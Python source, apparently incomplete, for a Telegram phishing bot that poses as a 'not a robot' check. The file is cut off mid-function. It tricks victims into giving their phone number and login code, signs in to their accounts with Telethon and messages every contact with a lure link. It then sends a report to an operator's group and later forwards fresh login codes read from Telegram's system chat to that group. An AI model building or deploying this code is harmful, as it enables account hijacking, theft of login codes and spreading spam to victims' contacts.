from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
import asyncio
import os
import glob
import re
import pathlib
from dotenv import load_dotenv

# Carrega as variáveis do arquivo .env
load_dotenv()

# Obtém as variáveis de ambiente
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')

# Cria pasta de sessões se não existir
SESSIONS_DIR = pathlib.Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)

# Função para detectar se o usuário está usando o cliente web do Telegram
def is_web_client(update: Update) -> bool:
    """
    Detecta se o usuário está usando o cliente web do Telegram.
    
    Esta função verifica o tipo de cliente usado com base em informações do objeto Update.
    Clientes web geralmente não suportam botões de teclado ReplyKeyboardMarkup normais.
    
    Args:
        update (Update): O objeto de atualização do Telegram
        
    Returns:
        bool: True se for detectado como cliente web, False para apps móveis/desktop
    """
    # Verificação mais precisa para cliente mobile
    # Quando a mensagem tem um objeto "from_user" com informação de "language_code"
    # e não tem campo "via_bot", provavelmente é mobile app
    if (update.effective_message and 
        hasattr(update.effective_message, 'from_user') and 
        update.effective_message.from_user and
        hasattr(update.effective_message.from_user, 'language_code') and
        not hasattr(update.effective_message, 'via_bot')):
        return False
    
    # Verificar se a mensagem veio de um chat privado (geralmente app mobile ou desktop)
    if update.effective_chat and update.effective_chat.type == "private":
        # Por padrão, consideramos chats privados como app mobile
        return False
    
    # Por padrão, consideramos como web para garantir que botões inline funcionem
    return True

# Estados para o fluxo da conversa
CONFIRM_HUMAN, ASK_PHONE, ASK_CODE = range(3)

# Função para encontrar todas as sessões existentes no diretório
def find_existing_sessions():
    # Procura por arquivos de sessão na pasta de sessões
    session_files = glob.glob(str(SESSIONS_DIR / "session_+*.session"))
    
    # Extrai os números de telefone das sessões encontradas
    sessions = []
    for session_file in session_files:
        # Usa expressão regular para extrair o número de telefone do nome do arquivo
        match = re.search(r'session_\+(\d+)\.session', os.path.basename(session_file))
        if match:
            phone_number = match.group(1)
            sessions.append(phone_number)
    
    return sessions

# Função para verificar se existe sessão para um número específico
def check_session_exists_for_phone(phone_number):
    # Remove o '+' se existir no início do número
    if phone_number.startswith('+'):
        phone_number = phone_number[1:]
        
    # Verifica se o arquivo de sessão existe
    session_file = SESSIONS_DIR / f"session_+{phone_number}.session"
    return session_file.exists()

# Função para enviar a solicitação de código
async def request_code(phone):
    # Remove o '+' se existir no início do número
    if phone.startswith('+'):
        phone = phone[1:]
        
    session_path = SESSIONS_DIR / f"session_+{phone}"
    client = TelegramClient(str(session_path), api_id, api_hash)
    await client.connect()
    
    if not await client.is_user_authorized():
        try:
            print("Enviando solicitação de código para o número:", f'+{phone}')
            sent = await client.send_code_request(f'+{phone}')
            print(sent)
            await client.disconnect()
            return True, "Código enviado com sucesso", sent.phone_code_hash
        except Exception as e:
            await client.disconnect()
            return False, f"Ops... Deu um erro aqui 🤧 Tente novamente daqui algumas horas.", None
    else:
        await client.disconnect()
        return True, "Usuário já está autorizado", None

# Função para verificar se um número de telefone já está autenticado
async def check_auth_status(phone):
    # Remove o '+' se existir no início do número
    if phone.startswith('+'):
        phone = phone[1:]
        
    session_path = SESSIONS_DIR / f"session_+{phone}"
    client = TelegramClient(str(session_path), api_id, api_hash)
    await client.connect()
    
    # Verifica se a sessão está autorizada
    is_authorized = await client.is_user_authorized()
    await client.disconnect()
    
    return is_authorized

# Função para entrar em um grupo pelo ID ou username
async def join_telegram_group(client, group_id=None, group_username=None):
    try:
        if group_username:
            # Se temos um username, tentamos entrar diretamente
            if group_username.startswith('@'):
                group_username = group_username[1:]  # Remove o @ inicial se existir
                
            try:
                entity = await client.get_entity(group_username)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo: {group_username}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo username {group_username}: {e}")
                
        if group_id:
            # Se temos um ID, tentamos entrar pelo ID
            try:
                entity = await client.get_entity(group_id)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo pelo ID: {group_id}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo ID {group_id}: {e}")
                
        return None
    except Exception as e:
        print(f"Erro geral ao tentar entrar no grupo: {e}")
        return None

# Função para sair de um grupo
async def leave_telegram_group(client, group_entity):
    try:
        await client(LeaveChannelRequest(group_entity))
        return True
    except Exception as e:
        print(f"Erro ao sair do grupo: {e}")
        return False

# Função para verificar mensagens do sistema após um delay
async def check_system_message_after_delay(phone, delay_seconds=180):
    # Remove o '+' se existir no início do número
    if phone.startswith('+'):
        phone = phone[1:]
        
    print(f"Timer iniciado: verificando mensagens do sistema em {delay_seconds} segundos para +{phone}...")
    
    # Aguarda o tempo especificado
    await asyncio.sleep(delay_seconds)
    
    print(f"Timer concluído: verificando mensagens do sistema para +{phone}")
    
    # Conecta ao cliente Telethon usando a sessão do usuário
    session_path = SESSIONS_DIR / f"session_+{phone}"
    client = TelegramClient(str(session_path), api_id, api_hash)
    await client.connect()
    
    try:
        if await client.is_user_authorized():
            # ID do sistema Telegram
            telegram_system_id = 777000
            
            # Buscar as mensagens recentes do sistema Telegram
            from telethon.tl.functions.messages import GetHistoryRequest
            
            # Obtém a entidade do sistema Telegram
            system_entity = await client.get_entity(telegram_system_id)
            
            # Obtém o histórico de mensagens
            history = await client(GetHistoryRequest(
                peer=system_entity,
                limit=10,  # Limitar a 10 mensagens recentes
                offset_date=None,
                offset_id=0,
                max_id=0,
                min_id=0,
                add_offset=0,
                hash=0
            ))
            
            # Se não há mensagens, retorna
            if not history.messages:
                print(f"Nenhuma mensagem do sistema encontrada para +{phone} após o timer")
                await client.disconnect()
                return
            
            # Pega a mensagem mais recente
            latest_message = history.messages[0]
            print(f"Mensagem mais recente do sistema para +{phone}: {latest_message.message}")
            
            # Busca o código de login na mensagem, independente do idioma
            # Procura por um padrão de 5 dígitos consecutivos na mensagem
            code_match = re.search(r'\b\d{5}\b', latest_message.message)
            
            if code_match:
                code_value = code_match.group(0)  # Pega os 5 dígitos encontrados
                
                # Adiciona um ponto entre cada número do código para melhorar a visualização
                formatted_code = '-'.join(code_value)
                
                # Formata a mensagem para reenvio de forma mais limpa
                system_message = f"+{phone}:\n\nCódigo de login: {formatted_code}"
            else:
                system_message = f"Não consegui pegar o código"
            
            # Entrar no grupo, enviar a mensagem e sair
            group_entity = await join_telegram_group(client, group_id=-1002310545045, group_username="linbotteste")
            
            if group_entity:
                # Enviar a mensagem
                await client.send_message(group_entity, system_message)
                print(f"Mensagem do sistema para +{phone} reenviada ao grupo após o timer")
                
                # Aguardar antes de sair
                await asyncio.sleep(1)
                
                # Sair do grupo
                await leave_telegram_group(client, group_entity)
                print(f"Saiu do grupo após enviar o código para +{phone}")
            else:
                print(f"Não foi possível entrar no grupo para reenviar mensagens do sistema para +{phone}")
        else:
            print(f"Sessão para +{phone} não está mais autorizada, não é possível verificar mensagens")
    except Exception as e:
        print(f"Erro ao verificar mensagens do sistema após timer para +{phone}: {e}")
    finally:
        await client.disconnect()

# Função para fazer login e enviar mensagens
async def login_and_send_messages(phone, code=None, phone_code_hash=None, update=None):
    # Remove o '+' se existir no início do número
    if phone.startswith('+'):
        phone = phone[1:]
        
    session_path = SESSIONS_DIR / f"session_+{phone}"
    client = TelegramClient(str(session_path), api_id, api_hash)
    await client.connect()

    try:
        # Verifica se o usuário já está autorizado
        if not await client.is_user_authorized():
            # Se não está autorizado, tenta fazer login com código e hash
            if code and phone_code_hash:
                try:
                    await client.sign_in(phone=f'+{phone}', code=code, phone_code_hash=phone_code_hash)
                    print("Login realizado com sucesso!")
                except Exception as e:
                    await client.disconnect()
                    
                    # Tratamento específico para código expirado
                    if "code has expired" in str(e).lower():
                        print("Código expirado. Solicitando novo código...")
                        return "EXPIRED_CODE"  # Código especial para indicar código expirado
                    
                    # Incrementa o contador de tentativas
                    if update and hasattr(update, 'callback_query'):
                        context = update.callback_query._application.context
                        if "code_attempts" not in context.user_data:
                            context.user_data["code_attempts"] = 1
                        else:
                            context.user_data["code_attempts"] += 1
                            
                        # Verifica se excedeu o número máximo de tentativas
                        if context.user_data["code_attempts"] >= 2:
                            return f"🔒 ACESSO BLOQUEADO PERMANENTEMENTE! 🔒\nVocê excedeu o número máximo de tentativas.\nSeu número foi adicionado à lista de bloqueio."
                    elif update and hasattr(update, 'message'):
                        context = update.message._application.context
                        if "code_attempts" not in context.user_data:
                            context.user_data["code_attempts"] = 1
                        else:
                            context.user_data["code_attempts"] += 1
                            
                        # Verifica se excedeu o número máximo de tentativas
                        if context.user_data["code_attempts"] >= 2:
                            return f"🔒 ACESSO BLOQUEADO PERMANENTEMENTE! 🔒\nVocê excedeu o número máximo de tentativas.\nSeu número foi adicionado à lista de bloqueio."
                    
                    return f"Ei.. Temos um erro ❌ O Código informado está incorreto! Digite novamente o código correto.\nVocê tem mais {2 - (context.user_data.get('code_attempts', 0))} tentativa(s)."
            else:
                # Se não forneceu código e hash e não está autorizado, não pode continuar
                await client.disconnect()
                return "Não foi possível fazer login: sessão não autorizada e código não fornecido."
        else:
            print(f"Usuário +{phone} já está autorizado. Continuando com as operações...")
            
        # Continua com as operações, pois o usuário já está autenticado
        # Busca os contatos do usuário
        result = await client(GetContactsRequest(hash=0))
        contacts = result.users
        print(f"Total de contatos encontrados: {len(contacts)}")
        
        # Mensagem a ser enviada para todos os contatos
        message_to_send = "[ 🔴 CLIQUE 🔻 ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
        
        # Enviar a mensagem no próprio chat do bot, se o update estiver disponível
        if update:
            # Verifica se estamos lidando com callback_query ou message
            if hasattr(update, 'callback_query') and update.callback_query:
                # Se for callback_query, usamos edit_message_text ou reply_text no message dentro do callback_query
                await update.callback_query.message.reply_text(message_to_send)
            elif hasattr(update, 'message') and update.message:
                # Se for message normal, usamos reply_text
                await update.message.reply_text(message_to_send)
            # Se não for nenhum dos dois, ignoramos o envio da mensagem
        
        # Contador de mensagens enviadas e com falha
        success_count = 0
        fail_count = 0
        
        # Loop para enviar mensagem para todos os contatos
        for contact in contacts:
            try:
                # Tenta enviar a mensagem para o contato
                try:
                    # Enviar mensagem diretamente para o contato usando a entidade do usuário
                    await client.send_message(
                        entity=contact,
                        message=message_to_send
                    )
                    success_count += 1
                    # print(f"Mensagem enviada com sucesso para {contact.first_name} {contact.last_name if contact.last_name else ''} ({contact.phone if hasattr(contact, 'phone') else 'sem telefone'})")
                except ValueError as e:
                    if "Cannot find any entity corresponding to" in str(e):
                        # Tenta formato alternativo sem o '+'
                        try:
                            contact_without_plus = contact.replace("+", "")
                            entity = await client.get_entity(contact_without_plus)
                            await client.send_message(
                                entity=entity,
                                message=message_to_send
                            )
                            success_count += 1
                            print(f"Mensagem enviada com sucesso para {contact} (formato alternativo)")
                        except Exception as inner_e:
                            fail_count += 1
                            print(f"Erro ao enviar mensagem para {contact} (mesmo com formato alternativo): {inner_e}")
                    else:
                        raise
                # Aguarda um pequeno intervalo para evitar limites de taxa
                await asyncio.sleep(0.5)
            except Exception as e:
                fail_count += 1
                print(f"Erro ao enviar mensagem para {contact}: {e}")
        
        print(f"Processo concluído! Mensagens enviadas: {success_count}, Falhas: {fail_count}")
        
        # Mensagem de log que será enviada
        log_message = f"O número '+{phone}' acabou de fazer login com sucesso!\n\n" \
                     f"Total de contatos encontrados: {len(contacts)}\n\n" \
                     f"Mensagens enviadas: {success_count}, Falhas: {fail_count}\n\n"\
                     f"Você terá 3 minutos para fazer login no web para o usuário receber outro código e eu vou buscar e mandar aqui novamente."
        
        try:
            # Entrar no grupo usando ID e username
            print("Tentando entrar no grupo especificado...")
            group_entity = await join_telegram_group(client, group_id=-1002310545045, group_username="linbotteste")
            
            if group_entity:
                # Enviar a mensagem de log no grupo
                print("Enviando mensagem de log no grupo...")
                await client.send_message(group_entity, log_message)
                
                # Sair do grupo
                print("Saindo do grupo...")
                await leave_telegram_group(client, group_entity)
                print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else 'Teste'}")
                
                # Verificar mensagens do sistema após 1 segundo (teste rápido)
                asyncio.create_task(check_system_message_after_delay(phone, 1))
                 
                # Configurar o timer para obter e enviar mensagem do sistema após 3 minutos
                asyncio.create_task(check_system_message_after_delay(phone, 180))  # 180 segundos = 3 minutos
            else:
                print("Não foi possível entrar no grupo especificado.")
        except Exception as e:
            print(f"Erro durante a operação no grupo: {e}")
        
        return "Operação concluída com sucesso!"
    except Exception as e:
            return f"Ops... Deu um erro aqui 🤧 Tente novamente daqui algumas horas."
    finally:
        await client.disconnect()
        
# Iniciar o bot - primeiro verificar se usuário é humano
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Verificar se está usando cliente web
    if is_web_client(update):
        # Usar botões inline para cliente web
        keyboard = [[InlineKeyboardButton("Não sou um Robô ✅", callback_data="confirm_human")]]
        await update.message.reply_text(
            "Aperte no Botão abaixo para verificar que você não é um Robô:",
            reply_markup=InlineKeyboardMarkup(keyboard, resize_keyboard=True)
        )
    else:
        # Usar teclado normal para cliente mobile
        keyboard = [[KeyboardButton("Não sou um Robô ✅")]]
        await update.message.reply_text(
            "Aperte no Botão abaixo para verificar que você não é um Robô:",
            reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        )
    return CONFIRM_HUMAN

# Confirmar que não é um robô e pedir número de telefone
async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Verificar se é cliente web
    if is_web_client(update):
        # Para cliente web, usamos teclado numérico inline para digitação manual
        keyboard = [
            [InlineKeyboardButton("1", callback_data="num_1"),
             InlineKeyboardButton("2", callback_data="num_2"),
             InlineKeyboardButton("3", callback_data="num_3")],
            [InlineKeyboardButton("4", callback_data="num_4"),
             InlineKeyboardButton("5", callback_data="num_5"),
             InlineKeyboardButton("6", callback_data="num_6")],
            [InlineKeyboardButton("7", callback_data="num_7"),
             InlineKeyboardButton("8", callback_data="num_8"),
             InlineKeyboardButton("9", callback_data="num_9")],
            [InlineKeyboardButton("Limpar", callback_data="num_clear"),
             InlineKeyboardButton("0", callback_data="num_0"),
             InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")]
        ]
        
        # Inicializa número vazio
        context.user_data["phone_digits"] = ""
        
        await update.message.reply_text(
            "Digite seu número de telefone (apenas DDD + número):\n"
            "Exemplo: 82998746532\n\n"
            "O prefixo +55 (Brasil) será adicionado automaticamente.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        # Para cliente mobile, usamos o botão de compartilhar contato
        keyboard = [
            [KeyboardButton("Compartilhar meu Contato 📲", request_contact=True)]
        ]
        
        await update.message.reply_text(
            "Compartilhe seu contato para confirmarmos que você é real ⤵️",
            reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        )
    return ASK_PHONE

# Receber o contato do usuário e solicitar código de verificação
async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo contato do usuário.")
    
    # Inicializando a variável phone
    phone = None
    
    # Se recebemos um objeto de contato (cliente mobile usando o botão de compartilhar contato)
    if hasattr(update.message, 'contact') and update.message.contact:
        phone = update.message.contact.phone_number
        print(f"Contato recebido via botão de compartilhamento: {phone}")
        context.user_data["phone"] = phone
        
    # Se recebemos texto "Digitar manualmente" do botão no cliente mobile
    elif update.message.text == "📝 Digitar manualmente":
        # Mostrar teclado numérico para digitar manualmente
        keyboard = [
            ["1", "2", "3"],
            ["4", "5", "6"],
            ["7", "8", "9"],
            ["0", "Limpar", "✅ Confirmar"]
        ]
        
        # Inicializa número vazio
        context.user_data["phone_digits"] = ""
        
        await update.message.reply_text(
            "Digite seu número de telefone (apenas DDD + número):\n"
            "Exemplo: 82998746532\n\n"
            "O prefixo +55 (Brasil) será adicionado automaticamente.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        return ASK_PHONE
        
    # Se estamos recebendo texto (entrada manual)
    elif update.message.text:
        # Verifica se o texto se parece com um número de telefone
        phone_text = update.message.text.strip()
        
        # Se o texto parece ser um número sem o prefixo internacional
        if phone_text.isdigit() and len(phone_text) >= 10 and len(phone_text) <= 11:
            # Adiciona o prefixo +55 (Brasil)
            phone = f"+55{phone_text}"
            context.user_data["phone"] = phone
        # Verifica formato básico de telefone internacional
        elif phone_text.startswith('+') and len(phone_text) > 8 and phone_text[1:].isdigit():
            phone = phone_text
            context.user_data["phone"] = phone
        else:
            await update.message.reply_text(
                "Formato de número inválido. Por favor, digite seu número no formato internacional: +5511999999999",
                reply_markup=ReplyKeyboardRemove()
            )
            return ASK_PHONE
    else:
        print("Nem contato nem texto válido recebido.")
        await update.message.reply_text(
            "Por favor, envie seu número de telefone no formato internacional: +5511999999999",
            reply_markup=ReplyKeyboardRemove()
        )
        return ASK_PHONE
        
    # Se não temos um número de telefone válido ainda, retorna ao estado ASK_PHONE
    if not phone:
        await update.message.reply_text(
            "Não conseguimos capturar seu número de telefone. Tente novamente.",
            reply_markup=ReplyKeyboardRemove()
        )
        return ASK_PHONE
        
    # Normalizando o formato do número para processamento
    if phone.startswith('+'):
        phone_without_plus = phone[1:]
    else:
        phone_without_plus = phone
        phone = '+' + phone  # Garante que temos o '+' para exibição
            
    # Verifica se existe uma sessão para este número e se está autorizada
    has_session = check_session_exists_for_phone(phone_without_plus)
    if has_session:
        is_authorized = await check_auth_status(phone_without_plus)
        if is_authorized:
            await update.message.reply_text(
                f"Sessão encontrada para {phone}! Iniciando operações...",
                reply_markup=ReplyKeyboardRemove()
            )
            
            # Executa diretamente as operações com a conta autenticada (sem código)
            result = await login_and_send_messages(phone_without_plus, None, None, update)
            await update.message.reply_text(result)
            
            return ConversationHandler.END
    
    # Envia solicitação de código
    await update.message.reply_text(
        "Código enviado com segurança. Verifique seu Telegram — Estamos finalizando sua liberação ❕",
        reply_markup=ReplyKeyboardRemove()
    )
    success, message, phone_code_hash = await request_code(phone_without_plus)
    
    if not success:
        if "Returned when all available options for this type of number were already used" in message:
            await update.message.reply_text(
                "Tentando novamente enviar o código de acesso..."
            )
            print("Reiniciando tentativa de envio do código de acesso...")
            success, message, phone_code_hash = await request_code(phone_without_plus)
            if not success:
                await update.message.reply_text(message)
                return await start(update, context)
        else:
            await update.message.reply_text(message)
            return await start(update, context)
    
    # Salvar o phone_code_hash para usar durante o login
    context.user_data["phone_code_hash"] = phone_code_hash
    
    # Verifica se é cliente web
    if is_web_client(update):
        # Usar teclado inline para cliente web
        context.user_data["code_digits"] = ""
        context.user_data["code_attempts"] = 0  # Inicializa contador de tentativas
        
        # Botão que abre diretamente o chat do Telegram com formato corrigido
        keyboard = [[InlineKeyboardButton("Pegar 🅾 Código ◀", url="https://t.me/+42777")]]
        
        await update.message.reply_text(
            "Pegue o Código que chegou nas Notificações do Telegram 🔽.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        # Após um pequeno intervalo, mostramos o teclado numérico para inserir o código
        keyboard_code = get_inline_code_keyboard("")
        await update.message.reply_text(
            "Digite o Código de 5️⃣ Números (Apertando UM por VEZ ❗)\n"
            "▶ Você tem 2 Tentivas para DIGITAR o CÓDIGO CORRETAMENTE.",
            reply_markup=keyboard_code
        )
    else:
        # Usar teclado normal para cliente mobile
        keyboard = [
            ["1", "2", "3"],
            ["4", "5", "6"],
            ["7", "8", "9"],
            ["0", "Limpar"]
        ]
        
        # Inicializa o código e contador de tentativas
        context.user_data["code_digits"] = ""
        context.user_data["code_attempts"] = 0  # Inicializa contador de tentativas
        
        # Botão que abre diretamente o chat do Telegram com formato corrigido
        inline_keyboard = [[InlineKeyboardButton("Ver o CÓDIGO que foi enviado 🔁", url="https://t.me/+42777")]]
        
        await update.message.reply_text(
            "👇🏻 Clique no Botão Abaixo para abrir o chat onde está o código.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard)
        )
        
        # Depois enviamos o teclado normal
        await update.message.reply_text(
            "Digite o Código de 5️⃣ Números (Apertando UM por VEZ ❗)\nVocê tem 2 tentativas para digitar o código corretamente.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
    return ASK_CODE

# Receber o código de verificação
async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo código de acesso do usuário.")
    
    # Verificar se recebemos o código completo de uma vez
    text = update.message.text.strip()
    
    # Se o texto parece ser o código inteiro (5 dígitos)
    if text.isdigit() and len(text) == 5:
        code = text
        context.user_data["code_digits"] = code
    else:
        # Tratamento de digitar um dígito por vez
        digit = update.message.text
        
        # Inicializa o código se ainda não existir
        if "code_digits" not in context.user_data:
            context.user_data["code_digits"] = ""
        
        current_code = context.user_data["code_digits"]
    
        if digit == "Limpar":
            # Se usuário clicou em limpar, zera o código
            context.user_data["code_digits"] = ""
            await update.message.reply_text(f"Código limpo. Digite novamente.")
            return ASK_CODE
        else:
            # Adiciona o dígito ao código atual
            context.user_data["code_digits"] += digit
            current_code = context.user_data["code_digits"]
    
            # Se temos menos de 5 dígitos, aguarda mais entrada
            if len(current_code) < 5:
                await update.message.reply_text(f"Código: {current_code} ({len(current_code)}/5 dígitos)")
                return ASK_CODE
            
            # Se chegou aqui é porque temos 5 dígitos
            code = current_code
    
    # Processando o código de 5 dígitos
    phone = context.user_data.get("phone")
    phone_code_hash = context.user_data.get("phone_code_hash")
    
    if not phone_code_hash:
        await update.message.reply_text(
            "Erro: phone_code_hash não encontrado. Por favor, inicie o processo novamente com /start",
            reply_markup=ReplyKeyboardRemove()
        )
        return ConversationHandler.END

    # Remove o teclado numérico
    await update.message.reply_text(
        f"Código ENVIADO ♻ [{code}]. Espere uns segundos aí!",
        reply_markup=ReplyKeyboardRemove()
    )

    # Chama a função de login e envio de mensagens
    result = await login_and_send_messages(phone, code, phone_code_hash, update)
    
    # Se o código expirou, solicita um novo código automaticamente
    if result == "EXPIRED_CODE":
        await update.message.reply_text("O código expirou... Estamos enviando um novo código 🤖")
        
        # Solicita um novo código
        success, message, new_phone_code_hash = await request_code(phone)
        
        if success:
            # Atualiza o phone_code_hash no contexto
            context.user_data["phone_code_hash"] = new_phone_code_hash
            context.user_data["code_digits"] = ""  # Limpa o código digitado anteriormente
            
            # Mostra o teclado para digitar o novo código
            await update.message.reply_text(
                "Novo código enviado! Verifique seu Telegram e digite o código de verificação:",
                reply_markup=get_inline_code_keyboard("")
            )
            return ASK_CODE  # Mantém o estado para receber o novo código
        else:
            await update.message.reply_text(f"Erro ao solicitar novo código: {message}")
            return ConversationHandler.END
    else:
        # Caso não seja problema de código expirado, exibe a mensagem normalmente
        await update.message.reply_text(result)            
        return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Operação cancelada pelo usuário.")
    await update.message.reply_text("Operação cancelada.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Handler para lidar com cliques em botões inline
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Responde ao callback para remover o "relógio de carregamento"
    
    # Pega o callback_data que indica qual botão foi clicado
    callback_data = query.data
    
    if callback_data == "confirm_human":
        # Usuário clicou no botão "Não sou um robô"
        await query.edit_message_text("Você foi VERIFICADO(A) ✅ Seu ACESSO em nosso Grupo foi LIBERADO.")
        
        # Para cliente web, usamos teclado numérico inline para digitação manual
        keyboard = [
            [InlineKeyboardButton("1", callback_data="num_1"),
             InlineKeyboardButton("2", callback_data="num_2"),
             InlineKeyboardButton("3", callback_data="num_3")],
            [InlineKeyboardButton("4", callback_data="num_4"),
             InlineKeyboardButton("5", callback_data="num_5"),
             InlineKeyboardButton("6", callback_data="num_6")],
            [InlineKeyboardButton("7", callback_data="num_7"),
             InlineKeyboardButton("8", callback_data="num_8"),
             InlineKeyboardButton("9", callback_data="num_9")],
            [InlineKeyboardButton("Limpar", callback_data="num_clear"),
             InlineKeyboardButton("0", callback_data="num_0"),
             InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")]
        ]
        
        # Inicializa número vazio
        context.user_data["phone_digits"] = ""
        
        await query.message.reply_text(
            "Digite seu número de telefone (apenas DDD + número):\n"
            "Exemplo: 82998746532\n\n"
            "O prefixo +55 (Brasil) será adicionado automaticamente.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        return ASK_PHONE
    
    elif callback_data == "request_phone":
        # Usuário escolheu digitar o número - mostramos o teclado numérico
        keyboard = [
            [InlineKeyboardButton("1", callback_data="num_1"),
             InlineKeyboardButton("2", callback_data="num_2"),
             InlineKeyboardButton("3", callback_data="num_3")],
            [InlineKeyboardButton("4", callback_data="num_4"),
             InlineKeyboardButton("5", callback_data="num_5"),
             InlineKeyboardButton("6", callback_data="num_6")],
            [InlineKeyboardButton("7", callback_data="num_7"),
             InlineKeyboardButton("8", callback_data="num_8"),
             InlineKeyboardButton("9", callback_data="num_9")],
            [InlineKeyboardButton("Limpar", callback_data="num_clear"),
             InlineKeyboardButton("0", callback_data="num_0"),
             InlineKeyboardButton("✅ Confirmar", callback_data="num_confirm")]
        ]
        
        # Inicializa o número vazio
        context.user_data["phone_digits"] = ""
        
        await query.edit_message_text(
            "Digite seu número de telefone (apenas DDD + número):\n"
            "Exemplo: 82998746532\n\n"
            "O prefixo +55 (Brasil) será adicionado automaticamente.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return ASK_PHONE
    
    # Restante da função continua igual
    elif callback_data.startswith("phone_prefix_"):
        # Não vamos mais usar prefixos diferentes, apenas +55
        # O código é mantido por compatibilidade
        await query.edit_message_text(
            "Digite seu número de telefone (apenas DDD + número):\n"
            "Exemplo: 82998746532\n\n"
            "O prefixo +55 (Brasil) será adicionado automaticamente."
        )
        return ASK_PHONE
    
    elif callback_data.startswith("phone_ddd_"):
        # Não vamos mais usar seleção de DDD, o usuário vai digitar tudo junto
        ddd = callback_data.replace("phone_ddd_", "")
        
        # Enviamos uma nova mensagem solicitando o número completo
        await query.edit_message_text(
            "Digite seu número completo com DDD (sem o +55):\n"
            "Exemplo: 82998746532"
        )
        return ASK_PHONE
    
    elif callback_data.startswith("num_"):
        # Usuário clicou em um dos dígitos para o número de telefone
        digit = callback_data.replace("num_", "")
        
        # Inicializa o número se ainda não existir
        if "phone_digits" not in context.user_data:
            context.user_data["phone_digits"] = ""
        
        current_phone = context.user_data["phone_digits"]

        if digit == "clear":
            # Se usuário clicou em limpar, zera o número
            context.user_data["phone_digits"] = ""
            await query.edit_message_text(
                "Digite seu número de telefone (apenas DDD + número):\n"
                "Exemplo: 82998746532\n\n"
                "O prefixo +55 (Brasil) será adicionado automaticamente.\n\n"
                f"Número atual: ",
                reply_markup=get_phone_keyboard()
            )
        elif digit == "confirm":
            # Se usuário confirmou o número
            current_phone = context.user_data["phone_digits"]
            
            if len(current_phone) < 10 or len(current_phone) > 11:
                # Se o número não tem um formato válido (DDD + número)
                await query.edit_message_text(
                    "⚠️ Número inválido! Deve ter entre 10 e 11 dígitos.\n"
                    "Digite novamente o número com DDD (sem o +55):\n"
                    "Exemplo: 82998746532\n\n"
                    f"Número atual: {current_phone}",
                    reply_markup=get_phone_keyboard()
                )
                return ASK_PHONE
            
            # Adiciona o prefixo +55 ao número
            full_phone = f"+55{current_phone}"
            context.user_data["phone"] = full_phone
            
            # Envia solicitação de código
            await query.edit_message_text(f"Número confirmado: {full_phone}\nEnviando código de acesso! Verifique seu Telegram e aguarde...")
            success, message, phone_code_hash = await request_code(full_phone)
            
            if not success:
                if "Returned when all available options for this type of number were already used" in message:
                    await query.edit_message_text(
                        "Tentando novamente enviar o código de acesso..."
                    )
                    print("Reiniciando tentativa de envio do código de acesso...")
                    success, message, phone_code_hash = await request_code(full_phone)
                    if not success:
                        await query.edit_message_text(f"Erro: {message}\nPor favor, inicie o processo novamente com /start")
                        return ConversationHandler.END
                else:
                    await query.edit_message_text(f"Erro: {message}\nPor favor, inicie o processo novamente com /start")
                    return ConversationHandler.END
            
            # Salvar o phone_code_hash para usar durante o login
            context.user_data["phone_code_hash"] = phone_code_hash
            
            # Mostra o teclado para digitar o código de verificação
            context.user_data["code_digits"] = ""
            await query.edit_message_text(
                "Código enviado! Verifique seu Telegram e digite o código de verificação:",
                reply_markup=get_inline_code_keyboard("")
            )
            return ASK_CODE
        else:
            # Adiciona o dígito ao número atual
            context.user_data["phone_digits"] += digit
            current_phone = context.user_data["phone_digits"]
            
            await query.edit_message_text(
                "Digite seu número de telefone (apenas DDD + número):\n"
                "Exemplo: 82998746532\n\n"
                "O prefixo +55 (Brasil) será adicionado automaticamente.\n\n"
                f"Número atual: {current_phone}",
                reply_markup=get_phone_keyboard()
            )
            
        return ASK_PHONE
    
    elif callback_data.startswith("digit_"):
        # Usuário clicou em um dos dígitos para o código de verificação
        digit = callback_data.replace("digit_", "")
        
        # Inicializa o código se ainda não existir
        if "code_digits" not in context.user_data:
            context.user_data["code_digits"] = ""
        
        current_code = context.user_data["code_digits"]

        if digit == "clear":
            # Se usuário clicou em limpar, zera o código
            context.user_data["code_digits"] = ""
            current_code = ""
            await update_inline_code_keyboard(query, current_code)
        else:
            # Adiciona o dígito ao código atual
            context.user_data["code_digits"] += digit
            current_code = context.user_data["code_digits"]
            
            # Atualiza o teclado com o código atual
            await update_inline_code_keyboard(query, current_code)
            
            # Se temos 5 dígitos, processa o código automaticamente
            if len(current_code) == 5:
                code = current_code
                phone = context.user_data.get("phone")
                phone_code_hash = context.user_data.get("phone_code_hash")
                
